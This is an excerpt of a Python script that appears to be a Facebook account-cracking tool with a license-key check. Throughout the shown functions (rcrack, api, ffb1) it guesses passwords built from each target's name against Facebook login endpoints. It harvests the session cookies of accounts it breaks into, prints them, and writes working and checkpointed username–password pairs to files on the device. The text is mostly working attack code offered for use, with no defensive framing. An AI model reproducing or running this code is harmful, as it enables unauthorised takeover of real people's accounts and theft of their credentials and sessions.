#Created By RK CIZDMR
#facebook : facebook.com/krhouvallie
...
------------------------------------------------------------------------
\33[1;36m ᴀᴜᴛʜᴏʀ    : ʀᴋ ᴄɪᴢᴅᴍʀ
\33[1;36m ᴠᴇʀsɪᴏɴ    : 0.01
\33[1;36m ғᴀᴄᴇʙᴏᴏᴋ  : ᴋʀʜᴏᴜᴠᴀʟʟɪᴇ
\33[1;36m ᴛᴏᴏʟ sᴛᴀᴛᴜs : ᴛʀɪᴀʟ
------------------------------------------------------------------------"""
...
def menu_apikey():
  ...
  id ='Its-RKC' +'→'.join(uuid)+str(os.getlogin())
  server = requests.get(f'https://github.com/Raki-404/Aprobel-JARED/blob/main/A.txt')
  x1()
  x2()
  try:
    httpCaht = requests.get(f"https://github.com/Raki-404/Aprobel-JARED/blob/main/A.txt").text
    if id in httpCaht:
...
def gml():
	...
	print('[?] Total Ok Id Save in  /sdcard/RKC-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/RKC-CP.txt')
	print(47*"-")
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[RKC-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/RKC-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\r\r\x1b[1;36m [RKC-CP] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RKC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [RKC-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def api(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [RKC-API-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [RKC-OK] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [RKC-LOGE] '+str(ids)+' | '+pas+'\033[1;97m')
...
def ffb1(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [RKC-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m║║\033[1;31mDEAD \033[1;32m%s\033[0m║║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
            ...
            if 'session_key' in req:
                ...
                open('/sdcard/RKC-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
